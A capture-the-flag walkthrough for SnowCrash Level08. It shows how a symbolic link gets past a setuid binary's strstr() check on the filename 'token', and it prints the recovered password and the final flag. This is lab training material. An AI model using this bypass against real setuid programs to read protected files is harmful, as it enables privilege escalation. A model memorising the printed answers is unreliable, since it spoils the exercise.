# 🚩 SnowCrash — Level08

## 🎯 Goal

Find the password for **flag08**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

A setuid binary `level08` and a `token` file owned by flag08 (we can't read it directly).

---

## 2. Analyze the binary

Try to read the token directly:

```bash
cat token
```

**Result:**

```
cat: token: Permission denied
```

Run the binary:

```bash
./level08
```

**Output:**

```
./level08 [file to read]
```

Try to read the token file with the binary:

```bash
./level08 token
```

**Output:**

```
You may not access 'token'
```

Examine the binary with strings:

```bash
strings level08
```

**Key findings:**

```
strstr
token
You may not access '%s'
```

**Analysis:**
- The binary is designed to read files with flag08 privileges
- It uses `strstr()` to check if the filename/path contains the string "token"
- If "token" is found anywhere in the path, access is denied
- **Vulnerability:** We can bypass this check using a symbolic link with a different name

---

## 3. Exploit via symbolic link bypass

The binary checks if the path contains "token", but we can create a symbolic link with a different name.

Create a symbolic link:

```bash
ln -s ~/token /tmp/toto
```

Read the file using the binary:

```bash
./level08 /tmp/toto
```

**Output:**

```
quif5eloekouj29ke0vouxean
```

This is the password for flag08!

---

## 4. Get the flag

Switch to flag08 user:

```bash
su flag08
```

Password: `quif5eloekouj29ke0vouxean`

Run getflag:

```bash
getflag
```

---

## ✅ Result

Output:

```
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

---

## 🎉 **Final Token for Level08**

```
25749xKZ8L7DkSCwJkT9dyv6f
```
